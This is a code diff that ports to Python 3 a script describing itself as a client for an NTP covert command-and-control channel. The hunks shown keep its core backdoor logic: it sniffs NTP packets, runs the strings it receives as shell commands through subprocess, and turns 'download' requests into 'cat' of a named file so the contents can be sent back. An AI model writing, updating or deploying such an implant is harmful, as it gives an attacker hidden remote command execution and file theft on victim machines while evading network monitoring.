@@ -3,7 +3,7 @@
 ### LIBRARIES ###
 
 from scapy.all import *
-import threading, os, sys, socket, string, commands, re, base64, argparse, pty, time, random
+import threading, os, sys, socket, string, subprocess, re, base64, argparse, pty, time, random
 
 #---Creates --help commands for arguments ---
 parser = argparse.ArgumentParser(description='Client for NTP Covert C2 Channel.')
@@ -85,7 +85,7 @@ replyme(initial_payload)
 filtered_array = []
 
 def c2(packet):
-	filtered_string = ''.join(filter(lambda x:x in string.printable, str(packet[0])))
+	filtered_string = ''.join([x for x in str(packet[0]) if x in string.printable])
         global filtered_array
         global upfile
         filtered_string = str(filtered_string).split('\x24') # Delimiting by $ as we need to take the header off
@@ -107,7 +107,7 @@ def c2(packet):
 			if cmd_string.split(' ')[0] == 'download': #---If the command from the ntpserver is download
 				cmd_string = 'cat ' + cmd_string.split(' ')[1] #---Concatenate the string following download, e.g.'anaconda-ks.cfg'
 				upfile = 'upfile' #---String that will be attached to file in the argument
-			cmd_output = commands.getstatusoutput(cmd_string) #---Makes the string input an actual command in terminal
+			cmd_output = subprocess.getstatusoutput(cmd_string) #---Makes the string input an actual command in terminal
 			#---Parses only for output of command and splits it by carriage return
 			cmd_output = str(cmd_output[1]).split('\n') #---Contains the actual output of cmd_string
 			###If the file has the string 'upfile'; they have selected 'download'
